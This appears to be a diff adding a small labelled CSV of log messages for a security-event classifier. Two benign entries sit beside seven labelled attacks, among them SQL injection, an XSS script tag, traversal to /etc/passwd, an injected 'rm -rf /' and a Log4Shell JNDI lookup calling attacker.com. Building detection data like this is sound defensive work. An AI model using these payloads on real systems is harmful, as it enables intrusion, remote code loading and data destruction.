@@ -1,0 +1,10 @@
+message,label,timestamp,level,severity,action,stage,rule_id,source_ip,source_port,dest_ip,dest_port,http_method,http_path,http_status,ocp_namespace,ocp_pod
+GET /api/v1/health 200 OK,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+User login success: admin,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+SQLi: SELECT * FROM users WHERE id = '1' OR '1'='1',1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+XSS: <script>alert('pwned')</script>,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+Path Traversal: GET /../../etc/passwd,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+RCE: ; rm -rf /,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+Credential Stuffing: 100 failed attempts from IP 45.x.y.z,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+JWT Bypass: algorithm none detected,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+Log4Shell: ${jndi:ldap://attacker.com/a},1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
